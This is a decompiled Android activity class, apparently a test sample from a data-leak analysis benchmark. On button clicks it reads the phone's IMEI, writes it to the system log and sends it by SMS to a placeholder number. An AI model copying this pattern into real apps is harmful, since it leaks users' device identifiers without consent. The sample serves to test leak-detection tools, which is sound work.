package de.ecspride;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

public class Button2
  extends Activity
{
  private String imei = null;
  
  public void clickOnButton3(View paramView)
  {
    imei = ((TelephonyManager)getSystemService("phone")).getDeviceId();
    Log.i("TAG", "Button3: " + imei);
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    ((Button)findViewById(2131165184)).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        SmsManager.getDefault().sendTextMessage("+49 1234", null, imei, null, null);
        Log.i("TAG", "sendIMEI: " + imei);
        imei = null;
      }
    });
    ((Button)findViewById(2131165185)).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        imei = null;
        Log.i("TAG", "Button 2: " + imei);
      }
    });
  }
}

/* Location:
 * Qualified Name:     de.ecspride.Button2
 * Java Class Version: 6 (50.0)
 * JD-Core Version:    0.7.1
 */